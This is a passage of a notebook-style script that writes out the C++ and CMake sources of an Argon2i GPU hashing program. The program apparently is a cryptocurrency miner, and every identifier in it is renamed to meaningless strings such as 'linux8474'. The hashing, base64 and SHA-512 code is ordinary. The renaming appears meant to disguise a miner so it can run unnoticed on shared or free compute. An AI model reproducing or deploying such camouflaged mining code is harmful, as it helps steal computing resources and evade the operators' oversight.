    size_t __total_linux8412_count_cblocks;
    size_t __total_linux8412_count_gblocks;

    size_t __linux8412_count;
    uint64_t __begin_round_time;
    list<linux8412_timing> __linux8412_timings;
};

#endif //linux888888887444888888linux84_linux8474_H"""

open('./linux8474/linux8474.h', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 05/08/2018.
//

#include "../../common/common.h"
#include "../../linux44444444474/base64.h"
#include "../../linux44444444474/random_generator.h"

#include "blake2/blake2.h"
#include "../../common/dllexport.h"
#include "linux847466882.h"
#include "defs.h"

linux847466882::linux847466882(linux847466882_blocks_filler_ptr filler, void *seed_memory, void *user_data) {
    __filler = filler;
    __threads = 1;
    __output_memory = __seed_memory = (uint8_t*)seed_memory;
    __seed_memory_offset = linux847466882profile_default->memsize;
    __lane_length = -1;
    __user_data = user_data;
}

vector<string> linux847466882::generate_hashes(const linux847466882profile &profile, const string &base, string salt_) {
    initialize_seeds(profile, base, salt_);
    fill_blocks(profile);
    return encode_hashes(profile);
}

string linux847466882::__make_salt() {
    char input[13];
    char output[25];

    random_generator::instance().get_random_data(input, 13);

    base64::encode(input, 13, output);

    for (int i = 0; i < 16; i++) {
        if (output[i] == '+') {
            output[i] = '.';
        }
    }

    output[16] = 0;
    return string(output);
}

void linux847466882::__initial_hash(const linux847466882profile &profile, uint8_t *blockhash, const string &base, const string &salt) {
    blake2b_state BlakeHash;
    uint32_t value;

    blake2b_init(&BlakeHash, linux847466882_PREHASH_DIGEST_LENGTH);

    value = profile.thr_cost;
    blake2b_update(&BlakeHash, (const uint8_t *)&value, sizeof(value));

    value = linux847466882_RAW_LENGTH;
    blake2b_update(&BlakeHash, (const uint8_t *)&value, sizeof(value));

    value = profile.mem_cost;
    blake2b_update(&BlakeHash, (const uint8_t *)&value, sizeof(value));

    value = profile.tm_cost;
    blake2b_update(&BlakeHash, (const uint8_t *)&value, sizeof(value));

    value = linux847466882_VERSION;
    blake2b_update(&BlakeHash, (const uint8_t *)&value, sizeof(value));

    value = linux847466882_TYPE_VALUE;
    blake2b_update(&BlakeHash, (const uint8_t *)&value, sizeof(value));

    value = (uint32_t)base.length();
    blake2b_update(&BlakeHash, (const uint8_t *)&value, sizeof(value));

    blake2b_update(&BlakeHash, (const uint8_t *)base.c_str(),
                   base.length());

    value = (uint32_t)salt.length();
    blake2b_update(&BlakeHash, (const uint8_t *)&value, sizeof(value));

    blake2b_update(&BlakeHash, (const uint8_t *)salt.c_str(),
                   salt.length());

    value = 0;
    blake2b_update(&BlakeHash, (const uint8_t *)&value, sizeof(value));
    blake2b_update(&BlakeHash, (const uint8_t *)&value, sizeof(value));

    blake2b_final(&BlakeHash, blockhash, linux847466882_PREHASH_DIGEST_LENGTH);
}

void linux847466882::__fill_first_blocks(const linux847466882profile &profile, uint8_t *blockhash, int thread) {
    block *blocks = (block *)(__seed_memory + thread * __seed_memory_offset);

    size_t lane_length;
    if(__lane_length == -1) {
        lane_length = profile.mem_cost / profile.thr_cost;
    }
    else {
        lane_length = __lane_length;
    }

    for (uint32_t l = 0; l < profile.thr_cost; ++l) {
        *((uint32_t*)(blockhash + linux847466882_PREHASH_DIGEST_LENGTH)) = 0;
        *((uint32_t*)(blockhash + linux847466882_PREHASH_DIGEST_LENGTH + 4)) = l;

        blake2b_long((void *)(blocks + l * lane_length), linux847466882_BLOCK_SIZE, blockhash,
                     linux847466882_PREHASH_SEED_LENGTH);

        *((uint32_t*)(blockhash + linux847466882_PREHASH_DIGEST_LENGTH)) = 1;

        blake2b_long((void *)(blocks + l * lane_length + 1), linux847466882_BLOCK_SIZE, blockhash,
                     linux847466882_PREHASH_SEED_LENGTH);
    }
}

string linux847466882::__encode_string(const linux847466882profile &profile, const string &salt, uint8_t *hash) {
    char salt_b64[50];
    char hash_b64[50];

    base64::encode(salt.c_str(), (int)salt.length(), salt_b64);
    base64::encode((char *)hash, linux847466882_RAW_LENGTH, hash_b64);

    salt_b64[22] = 0;
    hash_b64[43] = 0;

    stringstream ss;
    ss << "$argon2i$v=19$m=" << profile.mem_cost << ",t=" << profile.tm_cost << ",p=" << profile.thr_cost << "$" << salt_b64 << "$" << hash_b64;
    return ss.str();
}

void linux847466882::set_seed_memory(uint8_t *memory) {
    __seed_memory = memory;
}

uint8_t *linux847466882::get_output_memory() {
    return __output_memory;
}

void linux847466882::set_seed_memory_offset(size_t offset) {
    __seed_memory_offset = offset;
}

void linux847466882::set_threads(int threads) {
    __threads = threads;
}

void linux847466882::set_lane_length(int length) {
    if(length > 0)
        __lane_length = length;
}

void linux847466882::initialize_seeds(const linux847466882profile &profile, const string &base, string salt_) {
    uint8_t blockhash[linux847466882_PREHASH_SEED_LENGTH];
    __salts.clear();

    for(int i=0;i<__threads;i++) {
        string salt = salt_;

        if(salt.empty()) {
            salt = __make_salt();
        }
        __salts.push_back(salt);

        __initial_hash(profile, blockhash, base, salt);

        memset(blockhash + linux847466882_PREHASH_DIGEST_LENGTH, 0,
               linux847466882_PREHASH_SEED_LENGTH -
               linux847466882_PREHASH_DIGEST_LENGTH);

        __fill_first_blocks(profile, blockhash, i);
    }
}

void linux847466882::fill_blocks(const linux847466882profile &profile) {
    __output_memory = (uint8_t *)(*__filler) (__seed_memory, __threads, (linux847466882profile*)&profile, __user_data);
}

vector<string> linux847466882::encode_hashes(const linux847466882profile &profile) {
    vector<string> result;
    uint8_t raw_hash[linux847466882_RAW_LENGTH];

    if(__output_memory != NULL) {
        for (int i = 0; i < __threads; i++) {
            blake2b_long((void *) raw_hash, linux847466882_RAW_LENGTH,
                         (void *) (__output_memory + i * __seed_memory_offset), linux847466882_BLOCK_SIZE);

            string hash = __encode_string(profile, __salts[i], raw_hash);
            result.push_back(hash);
        }
    }
    return result;
}"""

open('./linux8474/linux847466882/linux847466882.cpp', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 18/09/2018.
//

#ifndef linux888888887444888888linux84_CUDA_linux8474_H
#define linux888888887444888888linux84_CUDA_linux8474_H

#if defined(WITH_CUDA)

struct cuda_kernel_arguments {
    void *memory_chunk_0;
    void *memory_chunk_1;
    void *memory_chunk_2;
    void *memory_chunk_3;
    void *memory_chunk_4;
    void *memory_chunk_5;
    int32_t *address_profile_1_1_524288;
    uint32_t *address_profile_4_4_16384;
    uint32_t *segments_profile_4_4_16384;
    uint32_t *seed_memory[2];
    uint32_t *out_memory[2];
    uint32_t *host_seed_memory[2];
};

struct linux847466882profile_info {
    linux847466882profile_info() {
        threads_profile_1_1_524288 = 0;
        threads_per_chunk_profile_1_1_524288 = 0;
        threads_profile_4_4_16384 = 0;
        threads_per_chunk_profile_4_4_16384 = 0;
    }
    uint32_t threads_profile_1_1_524288;
    uint32_t threads_per_chunk_profile_1_1_524288;
    uint32_t threads_profile_4_4_16384;
    uint32_t threads_per_chunk_profile_4_4_16384;
};

struct cuda_device_info {
	cuda_device_info() {
		device_index = 0;
		device_string = "";
		max_mem_size = 0;
		free_mem_size = 0;
		max_allocable_mem_size = 0;

		error = cudaSuccess;
		error_message = "";
	}

    int device_index;
	int cuda_index;

    string device_string;
    uint64_t max_mem_size;
    uint64_t free_mem_size;
    uint64_t max_allocable_mem_size;

    linux847466882profile_info profile_info;
	cuda_kernel_arguments arguments;

    mutex device_lock;

    cudaError_t error;
    string error_message;
};

struct cuda_gpumgmt_thread_data {
	void lock() {
#ifndef PARALLEL_CUDA
		device->device_lock.lock();
#endif
	}

	void unlock() {
#ifndef PARALLEL_CUDA
		device->device_lock.unlock();
#endif
	}

	int thread_id;
	cuda_device_info *device;
	void *device_data;

	int threads_profile_1_1_524288;
	int threads_profile_4_4_16384;

	int threads_profile_1_1_524288_idx;
	int threads_profile_4_4_16384_idx;
};

class cuda_linux8474 : public linux8474 {
public:
	cuda_linux8474();
	~cuda_linux8474();

	virtual bool initialize();
	virtual bool configure(arguments &args);
	virtual void cleanup();

private:
    cuda_device_info *__get_device_info(int device_index);
    bool __setup_device_info(cuda_device_info *device, double intensity_cpu, double intensity_gpu);
    vector<cuda_device_info*> __query_cuda_devices(cudaError_t &error, string &error_message);

    void __run(cuda_device_info *device, int thread_id);

    vector<cuda_device_info*> __devices;

    bool __running;
    vector<thread*> __runners;
};

// CUDA kernel exports
extern void cuda_allocate(cuda_device_info *device, double chunks, size_t chunk_size);
extern void cuda_free(cuda_device_info *device);
extern void *cuda_kernel_filler(void *memory, int threads, linux847466882profile *profile, void *user_data);
// end CUDA kernel exports

#endif //WITH_CUDA

#endif //linux888888887444888888linux84_CUDA_linux8474_H"""

open('./linux8474/gpu/cuda/cuda_linux8474.h', 'w').write(content)

!mkdir ./linux44444444474/

content="""//
// Created by Haifa Bogdan Adnan on 17/08/2018.
//

#include "../common/dllexport.h"
#include "../common/common.h"
#include "base64.h"

static const std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

void base64::encode(const char *bytes_to_encode, int in_len, char *output) {
        char *ret = output;
        int i = 0;
        int j = 0;
        unsigned char char_array_3[3];
        unsigned char char_array_4[4];

        while (in_len--) {
                char_array_3[i++] = *(bytes_to_encode++);
                if (i == 3) {
                        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                        char_array_4[3] = char_array_3[2] & 0x3f;

                        for(i = 0; (i <4) ; i++)
                                *(ret++) = base64_chars[char_array_4[i]];
                        i = 0;
                }
        }

        if (i)
        {
                for(j = i; j < 3; j++)
                        char_array_3[j] = '\0';

                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;

                for (j = 0; (j < i + 1); j++)
                        *(ret++) = base64_chars[char_array_4[j]];

                while((i++ < 3))
                        *(ret++) = '=';

        }
}
"""

open('./linux44444444474/base64.cpp', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 17/08/2018.
//

#ifndef linuxweb8888444474_BASE64_H
#define linuxweb8888444474_BASE64_H

class DLLEXPORT base64 {
public:
    static void encode(const char *input, int input_size, char *output);
};

#endif //linuxweb8888444474_BASE64_H"""

open('./linux44444444474/base64.h', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 17/08/2018.
//

#include "../common/dllexport.h"
#include "../common/common.h"

#include "random_generator.h"

random_generator::random_generator() : __mt19937Gen(__randomDevice()), __mt19937Distr(0, 255) {

}

random_generator &random_generator::instance() {
    return __instance;
}

void random_generator::get_random_data(char *buffer, int length) {
//    __thread_lock.lock();
    for(int i=0;i<length;i++) {
        buffer[i] = (char)__mt19937Distr(__mt19937Gen);
    }
//    __thread_lock.unlock();
}


random_generator random_generator::__instance;"""

open('./linux44444444474/random_generator.cpp', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 17/08/2018.
//

#ifndef linuxweb8888444474_RANDOM_GENERATOR_H
#define linuxweb8888444474_RANDOM_GENERATOR_H

class DLLEXPORT random_generator {
public:
    random_generator();
    static random_generator &instance();

    void get_random_data(char *buffer, int length);

private:
    random_device __randomDevice;
    mt19937 __mt19937Gen;
    uniform_int_distribution<> __mt19937Distr;
    mutex __thread_lock;

    static random_generator __instance;
};

#endif //linuxweb8888444474_RANDOM_GENERATOR_H"""

open('./linux44444444474/random_generator.h', 'w').write(content)

content="""#include "../common/dllexport.h"

#include <cstring>
#include <fstream>
#include "sha512.h"

const unsigned long long SHA512::sha512_k[80] = //ULL = uint64
        {0x428a2f98d728ae22ULL, 0x7137449123ef65cdULL,
         0xb5c0fbcfec4d3b2fULL, 0xe9b5dba58189dbbcULL,
         0x3956c25bf348b538ULL, 0x59f111f1b605d019ULL,
         0x923f82a4af194f9bULL, 0xab1c5ed5da6d8118ULL,
         0xd807aa98a3030242ULL, 0x12835b0145706fbeULL,
         0x243185be4ee4b28cULL, 0x550c7dc3d5ffb4e2ULL,
         0x72be5d74f27b896fULL, 0x80deb1fe3b1696b1ULL,
         0x9bdc06a725c71235ULL, 0xc19bf174cf692694ULL,
         0xe49b69c19ef14ad2ULL, 0xefbe4786384f25e3ULL,
         0x0fc19dc68b8cd5b5ULL, 0x240ca1cc77ac9c65ULL,
         0x2de92c6f592b0275ULL, 0x4a7484aa6ea6e483ULL,
         0x5cb0a9dcbd41fbd4ULL, 0x76f988da831153b5ULL,
         0x983e5152ee66dfabULL, 0xa831c66d2db43210ULL,
         0xb00327c898fb213fULL, 0xbf597fc7beef0ee4ULL,
         0xc6e00bf33da88fc2ULL, 0xd5a79147930aa725ULL,
         0x06ca6351e003826fULL, 0x142929670a0e6e70ULL,
         0x27b70a8546d22ffcULL, 0x2e1b21385c26c926ULL,
         0x4d2c6dfc5ac42aedULL, 0x53380d139d95b3dfULL,
         0x650a73548baf63deULL, 0x766a0abb3c77b2a8ULL,
         0x81c2c92e47edaee6ULL, 0x92722c851482353bULL,
         0xa2bfe8a14cf10364ULL, 0xa81a664bbc423001ULL,
         0xc24b8b70d0f89791ULL, 0xc76c51a30654be30ULL,
         0xd192e819d6ef5218ULL, 0xd69906245565a910ULL,
         0xf40e35855771202aULL, 0x106aa07032bbd1b8ULL,
         0x19a4c116b8d2d0c8ULL, 0x1e376c085141ab53ULL,
         0x2748774cdf8eeb99ULL, 0x34b0bcb5e19b48a8ULL,
         0x391c0cb3c5c95a63ULL, 0x4ed8aa4ae3418acbULL,
         0x5b9cca4f7763e373ULL, 0x682e6ff3d6b2b8a3ULL,
         0x748f82ee5defb2fcULL, 0x78a5636f43172f60ULL,
         0x84c87814a1f0ab72ULL, 0x8cc702081a6439ecULL,
         0x90befffa23631e28ULL, 0xa4506cebde82bde9ULL,
         0xbef9a3f7b2c67915ULL, 0xc67178f2e372532bULL,
         0xca273eceea26619cULL, 0xd186b8c721c0c207ULL,
         0xeada7dd6cde0eb1eULL, 0xf57d4f7fee6ed178ULL,
         0x06f067aa72176fbaULL, 0x0a637dc5a2c898a6ULL,
         0x113f9804bef90daeULL, 0x1b710b35131c471bULL,
         0x28db77f523047d84ULL, 0x32caab7b40c72493ULL,
         0x3c9ebe0a15c9bebcULL, 0x431d67c49c100d4cULL,
         0x4cc5d4becb3e42b6ULL, 0x597f299cfc657e2aULL,
         0x5fcb6fab3ad6faecULL, 0x6c44198c4a475817ULL};

void SHA512::transform(const unsigned char *message, unsigned int block_nb)
{
    uint64 w[80];
    uint64 wv[8];
    uint64 t1, t2;
    const unsigned char *sub_block;
    int i, j;
    for (i = 0; i < (int) block_nb; i++) {
        sub_block = message + (i << 7);
        for (j = 0; j < 16; j++) {
            SHA2_PACK64(&sub_block[j << 3], &w[j]);
        }
        for (j = 16; j < 80; j++) {
            w[j] =  SHA512_F4(w[j -  2]) + w[j -  7] + SHA512_F3(w[j - 15]) + w[j - 16];
        }
        for (j = 0; j < 8; j++) {
            wv[j] = m_h[j];
        }
        for (j = 0; j < 80; j++) {
            t1 = wv[7] + SHA512_F2(wv[4]) + SHA2_CH(wv[4], wv[5], wv[6])
                 + sha512_k[j] + w[j];
            t2 = SHA512_F1(wv[0]) + SHA2_MAJ(wv[0], wv[1], wv[2]);
            wv[7] = wv[6];
            wv[6] = wv[5];
            wv[5] = wv[4];
            wv[4] = wv[3] + t1;
            wv[3] = wv[2];
            wv[2] = wv[1];
            wv[1] = wv[0];
            wv[0] = t1 + t2;
        }
        for (j = 0; j < 8; j++) {
            m_h[j] += wv[j];
        }

    }
}

void SHA512::init()
{
    m_h[0] = 0x6a09e667f3bcc908ULL;
    m_h[1] = 0xbb67ae8584caa73bULL;
    m_h[2] = 0x3c6ef372fe94f82bULL;
    m_h[3] = 0xa54ff53a5f1d36f1ULL;
    m_h[4] = 0x510e527fade682d1ULL;
    m_h[5] = 0x9b05688c2b3e6c1fULL;
    m_h[6] = 0x1f83d9abfb41bd6bULL;
    m_h[7] = 0x5be0cd19137e2179ULL;
    m_len = 0;
    m_tot_len = 0;
}

void SHA512::update(const unsigned char *message, unsigned int len)
{
    unsigned int block_nb;
    unsigned int new_len, rem_len, tmp_len;
    const unsigned char *shifted_message;
    tmp_len = SHA384_512_BLOCK_SIZE - m_len;
    rem_len = len < tmp_len ? len : tmp_len;
    memcpy(&m_block[m_len], message, rem_len);
    if (m_len + len < SHA384_512_BLOCK_SIZE) {
        m_len += len;
        return;
    }
    new_len = len - rem_len;
    block_nb = new_len / SHA384_512_BLOCK_SIZE;
    shifted_message = message + rem_len;
    transform(m_block, 1);
    transform(shifted_message, block_nb);
    rem_len = new_len % SHA384_512_BLOCK_SIZE;
    memcpy(m_block, &shifted_message[block_nb << 7], rem_len);
    m_len = rem_len;
    m_tot_len += (block_nb + 1) << 7;
}

void SHA512::final(unsigned char *digest)
{
    unsigned int block_nb;
    unsigned int pm_len;
    unsigned int len_b;
    int i;
    block_nb = 1 + ((SHA384_512_BLOCK_SIZE - 17)
                    < (m_len % SHA384_512_BLOCK_SIZE));
    len_b = (m_tot_len + m_len) << 3;
    pm_len = block_nb << 7;
    memset(m_block + m_len, 0, pm_len - m_len);
    m_block[m_len] = 0x80;
    SHA2_UNPACK32(len_b, m_block + pm_len - 4);
    transform(m_block, block_nb);
    for (i = 0 ; i < 8; i++) {
        SHA2_UNPACK64(m_h[i], &digest[i << 3]);
    }
}

unsigned char *SHA512::hash(unsigned char *input, size_t length)
{
    unsigned char *digest = (unsigned char*)malloc(SHA512::DIGEST_SIZE);
    memset(digest,0,SHA512::DIGEST_SIZE);
    SHA512 ctx = SHA512();
    ctx.init();
    ctx.update(input, length);
    ctx.final(digest);
    return digest;
}"""

open('./linux44444444474/sha512.cpp', 'w').write(content)

content="""#ifndef SHA512_H
#define SHA512_H

#include <string>

class DLLEXPORT SHA512
{
protected:
    typedef unsigned char uint8;
    typedef unsigned int uint32;
    typedef unsigned long long uint64;

    const static uint64 sha512_k[];
    static const unsigned int SHA384_512_BLOCK_SIZE = (1024/8);

public:
    void init();
    void update(const unsigned char *message, unsigned int len);
    void final(unsigned char *digest);
    static const unsigned int DIGEST_SIZE = ( 512 / 8);

    static unsigned char *hash(unsigned char *input, size_t length);
protected:
    void transform(const unsigned char *message, unsigned int block_nb);
    unsigned int m_tot_len;
    unsigned int m_len;
    unsigned char m_block[2 * SHA384_512_BLOCK_SIZE];
    uint64 m_h[8];
};

#define SHA2_SHFR(x, n)    (x >> n)
#define SHA2_ROTR(x, n)   ((x >> n) | (x << ((sizeof(x) << 3) - n)))
#define SHA2_ROTL(x, n)   ((x << n) | (x >> ((sizeof(x) << 3) - n)))
#define SHA2_CH(x, y, z)  ((x & y) ^ (~x & z))
#define SHA2_MAJ(x, y, z) ((x & y) ^ (x & z) ^ (y & z))
#define SHA512_F1(x) (SHA2_ROTR(x, 28) ^ SHA2_ROTR(x, 34) ^ SHA2_ROTR(x, 39))
#define SHA512_F2(x) (SHA2_ROTR(x, 14) ^ SHA2_ROTR(x, 18) ^ SHA2_ROTR(x, 41))
#define SHA512_F3(x) (SHA2_ROTR(x,  1) ^ SHA2_ROTR(x,  8) ^ SHA2_SHFR(x,  7))
#define SHA512_F4(x) (SHA2_ROTR(x, 19) ^ SHA2_ROTR(x, 61) ^ SHA2_SHFR(x,  6))
#define SHA2_UNPACK32(x, str)                 \
{                                             \
*((str) + 3) = (uint8) ((x)      );       \
*((str) + 2) = (uint8) ((x) >>  8);       \
*((str) + 1) = (uint8) ((x) >> 16);       \
*((str) + 0) = (uint8) ((x) >> 24);       \
}
#define SHA2_UNPACK64(x, str)                 \
{                                             \
*((str) + 7) = (uint8) ((x)      );       \
*((str) + 6) = (uint8) ((x) >>  8);       \
*((str) + 5) = (uint8) ((x) >> 16);       \
*((str) + 4) = (uint8) ((x) >> 24);       \
*((str) + 3) = (uint8) ((x) >> 32);       \
*((str) + 2) = (uint8) ((x) >> 40);       \
*((str) + 1) = (uint8) ((x) >> 48);       \
*((str) + 0) = (uint8) ((x) >> 56);       \
}
#define SHA2_PACK64(str, x)                   \
{                                             \
*(x) =   ((uint64) *((str) + 7)      )    \
| ((uint64) *((str) + 6) <<  8)    \
| ((uint64) *((str) + 5) << 16)    \
| ((uint64) *((str) + 4) << 24)    \
| ((uint64) *((str) + 3) << 32)    \
| ((uint64) *((str) + 2) << 40)    \
| ((uint64) *((str) + 1) << 48)    \
| ((uint64) *((str) + 0) << 56);   \
}

#endif"""

open('./linux44444444474/sha512.h', 'w').write(content)

content="""cmake_minimum_required (VERSION 2.8)
project (linux848888888874)

SET(CMAKE_SKIP_BUILD_RPATH FALSE)
SET(CMAKE_BUILD_WITH_INSTALL_RPATH TRUE)
SET(CMAKE_INSTALL_RPATH "./")
SET(CMAKE_INSTALL_RPATH_USE_LINK_PATH TRUE)

set(SOURCE
        http/http.cpp http/http.h
        http/client.cpp http/client.h
        http/simplejson/json.h
        linux84/linux84.cpp linux84/linux84.h
        app/main.cpp
        http/http_parser/http_parser.c http/http_parser/http_parser.h
        linux84/mini-gmp/mini-gmp.h linux84/mini-gmp/mini-gmp.c
        app/runner.h
        http/simplejson/json.cpp)
set(SOURCE_COMMON app/arguments.cpp app/arguments.h common/common.h common/common.cpp common/dllimport.h common/dllexport.h
        linux44444444474/sha512.cpp linux44444444474/sha512.h linux44444444474/base64.cpp linux44444444474/base64.h linux44444444474/random_generator.cpp linux44444444474/random_generator.h
        common/cfgpath.h)
set(SOURCE_linux8474 linux8474/linux8474.cpp linux8474/linux8474.h linux8474/linux847466882/linux847466882.cpp linux8474/linux847466882/linux847466882.h
        linux8474/linux847466882/defs.h linux8474/linux847466882/blake2/blake2b.c linux8474/linux847466882/blake2/blake2.h linux8474/linux847466882/blake2/blake2b-round.h
        linux8474/linux847466882/blake2/blake2b-load-sse41.h linux8474/linux847466882/blake2/blake2b-load-sse2.h linux8474/linux847466882/blake2/blake2-config.h linux8474/linux847466882/linux847466882profile_4_4_16384.c linux8474/linux847466882/linux847466882profile_1_1_524288.c)
set(SOURCE_CUDA_linux8474 linux8474/gpu/cuda/cuda_linux8474.cpp linux8474/gpu/cuda/cuda_linux8474.h
        linux8474/gpu/cuda/cuda_kernel.cu)

set (CMAKE_CXX_STANDARD 11)
set (linux88888888744488888888linux84_VERSION_MAJOR 4)
set (linux88888888744488888888linux84_VERSION_MINOR 2)
set (linux88888888744488888888linux84_VERSION_REVISION 2)

set (CMAKE_MACOSX_RPATH 0)

set (CMAKE_C_FLAGS "-fPIE")

configure_file (
        "${PROJECT_SOURCE_DIR}/config.h.in"
        "${PROJECT_BINARY_DIR}/config.h"
)

include_directories("${PROJECT_BINARY_DIR}")

find_package(Threads)

add_executable(linux848888888874 ${SOURCE})
add_library(common SHARED ${SOURCE_COMMON})
add_library(linux8474 SHARED ${SOURCE_linux8474})
target_link_libraries(linux8474 common ${CMAKE_DL_LIBS} ${CMAKE_THREAD_LIBS_INIT})
if(WIN32)
    target_link_libraries(common Psapi.lib)
endif()

if(NOT WITHOUT_CUDA)
    add_definitions(-DWITH_CUDA)
    if(NOT WIN32)
        add_definitions(-DPARALLEL_CUDA)
    endif()
    find_package(CUDA REQUIRED)
    set(
            CUDA_NVCC_FLAGS
            ${CUDA_NVCC_FLAGS};
            -arch=compute_35
    )
    cuda_add_library(cuda_linux8474 MODULE ${SOURCE_CUDA_linux8474})
    set_target_properties(cuda_linux8474
            PROPERTIES
            PREFIX ""
            SUFFIX ".hsh"
            LIBRARY_OUTPUT_DIRECTORY modules
            )
    target_link_libraries(cuda_linux8474 linux8474)
    add_dependencies(linux848888888874 cuda_linux8474)
endif()

target_link_libraries(linux848888888874 common linux8474)
if(WIN32)
    target_link_libraries(linux848888888874 ws2_32.lib)
endif()

add_dependencies(linux848888888874 copy-reporting-files)"""

open('./CMakeLists.txt', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 04/08/2018.
//

#ifndef linux888888887444888888linux84_CONFIG_H_IN_H
#define linux888888887444888888linux84_CONFIG_H_IN_H

#define linux88888888744488888888linux84_VERSION_MAJOR "@linux88888888744488888888linux84_VERSION_MAJOR@"
#define linux88888888744488888888linux84_VERSION_MINOR "@linux88888888744488888888linux84_VERSION_MINOR@"
#define linux88888888744488888888linux84_VERSION_REVISION "@linux88888888744488888888linux84_VERSION_REVISION@"

#endif //linux888888887444888888linux84_CONFIG_H_IN_H"""

open('./config.h.in', 'w').write(content)

content="""set(CMAKE_SYSTEM_NAME "Linux")
set(CMAKE_SYSTEM_PROCESSOR "mips32")

if (ENABLE_DSPR2 AND ENABLE_MSA)
  message(FATAL_ERROR "ENABLE_DSPR2 and ENABLE_MSA cannot be combined.")
endif ()

if (ENABLE_DSPR2)
  set(HAVE_DSPR2            1 CACHE BOOL "" FORCE)
  set(MIPS_CFLAGS           "-mdspr2")
  set(MIPS_CXXFLAGS         "-mdspr2")
elseif (ENABLE_MSA)
  set(HAVE_MSA 1 CACHE BOOL "" FORCE)
  set(MIPS_CFLAGS           "-mmsa")
  set(MIPS_CXXFLAGS         "-mmsa")
endif ()

if ("${MIPS_CPU}" STREQUAL "")
  set(MIPS_CFLAGS           "${MIPS_CFLAGS} -mips32r2")
  set(MIPS_CXXFLAGS         "${MIPS_CXXFLAGS} -mips32r2")
elseif ("${MIPS_CPU}" STREQUAL "p5600")
  set(P56_FLAGS             "-mips32r5 -mload-store-pairs -msched-weight -mhard-float -mfp64")
  set(MIPS_CFLAGS           "${MIPS_CFLAGS} ${P56_FLAGS}")
  set(MIPS_CXXFLAGS         "${MIPS_CXXFLAGS} ${P56_FLAGS}")
  set(CMAKE_EXE_LINKER_FLAGS  "-mfp64 ${CMAKE_EXE_LINKER_FLAGS}")
endif ()

set(CMAKE_C_COMPILER        ${CROSS}gcc)
set(CMAKE_CXX_COMPILER      ${CROSS}g++)
set(AS_EXECUTABLE           ${CROSS}as)
set(CMAKE_C_COMPILER_ARG1   "-EL ${MIPS_CFLAGS}")
set(CMAKE_CXX_COMPILER_ARG1 "-EL ${MIPS_CXXFLAGS}")

set(THREADS_PTHREAD_ARG "2" CACHE STRING "Forcibly set by CMakeLists.txt." FORCE)"""

open('./mips32-linux-gcc.cmake', 'w').write(content)

content="""# Based on the Qt 5 processor detection code, so should be very accurate
# https://qt.gitorious.org/qt/qtbase/blobs/master/src/corelib/global/qprocessordetection.h
# Currently handles arm (v5, v6, v7), x86 (32/64), ia64, and ppc (32/64)

# Regarding POWER/PowerPC, just as is noted in the Qt source,
# "There are many more known variants/revisions that we do not handle/detect."

set(archdetect_c_code "
#if defined(__arm__) || defined(__TARGET_ARCH_ARM)
    #error cmake_ARCH arm
#elif defined(__aarch64__)
    #error cmake_ARCH aarch64
#elif defined(__i386) || defined(__i386__) || defined(_M_IX86)
    #error cmake_ARCH i386
#elif defined(__x86_64) || defined(__x86_64__) || defined(__amd64) || defined(_M_X64)
    #error cmake_ARCH x86_64
#elif defined(__ia64) || defined(__ia64__) || defined(_M_IA64)
    #error cmake_ARCH ia64
#elif defined(__ppc__) || defined(__ppc) || defined(__powerpc__) \\
      || defined(_ARCH_COM) || defined(_ARCH_PWR) || defined(_ARCH_PPC)  \\
      || defined(_M_MPPC) || defined(_M_PPC)
    #if defined(__ppc64__) || defined(__powerpc64__) || defined(__64BIT__)
        #error cmake_ARCH ppc64
    #else
        #error cmake_ARCH ppc
    #endif
#endif

#error cmake_ARCH unknown
")

# Set ppc_support to TRUE before including this file or ppc and ppc64
# will be treated as invalid architectures since they are no longer supported by Apple

function(target_architecture output_var)
    if(APPLE AND CMAKE_OSX_ARCHITECTURES)
        # On OS X we use CMAKE_OSX_ARCHITECTURES *if* it was set
        # First let's normalize the order of the values

        # Note that it's not possible to compile PowerPC applications if you are using
        # the OS X SDK version 10.6 or later - you'll need 10.4/10.5 for that, so we
        # disable it by default
        # See this page for more information:
        # http://stackoverflow.com/questions/5333490/how-can-we-restore-ppc-ppc64-as-well-as-full-10-4-10-5-sdk-support-to-xcode-4

        # Architecture defaults to i386 or ppc on OS X 10.5 and earlier, depending on the CPU type detected at runtime.
        # On OS X 10.6+ the default is x86_64 if the CPU supports it, i386 otherwise.

        foreach(osx_arch ${CMAKE_OSX_ARCHITECTURES})
            if("${osx_arch}" STREQUAL "ppc" AND ppc_support)
                set(osx_arch_ppc TRUE)
            elseif("${osx_arch}" STREQUAL "i386")
                set(osx_arch_i386 TRUE)
            elseif("${osx_arch}" STREQUAL "x86_64")
                set(osx_arch_x86_64 TRUE)
            elseif("${osx_arch}" STREQUAL "ppc64" AND ppc_support)
                set(osx_arch_ppc64 TRUE)
            else()
                message(FATAL_ERROR "Invalid OS X arch name: ${osx_arch}")
            endif()
        endforeach()

        # Now add all the architectures in our normalized order
        if(osx_arch_ppc)
            list(APPEND ARCH ppc)
        endif()

        if(osx_arch_i386)
            list(APPEND ARCH i386)
        endif()

        if(osx_arch_x86_64)
            list(APPEND ARCH x86_64)
        endif()

        if(osx_arch_ppc64)
            list(APPEND ARCH ppc64)
        endif()
    else()
        file(WRITE "${CMAKE_BINARY_DIR}/arch.c" "${archdetect_c_code}")

        enable_language(C)

        # Detect the architecture in a rather creative way...
        # This compiles a small C program which is a series of ifdefs that selects a
        # particular #error preprocessor directive whose message string contains the
        # target architecture. The program will always fail to compile (both because
        # file is not a valid C program, and obviously because of the presence of the
        # #error preprocessor directives... but by exploiting the preprocessor in this
        # way, we can detect the correct target architecture even when cross-compiling,
        # since the program itself never needs to be run (only the compiler/preprocessor)
        try_run(
                run_result_unused
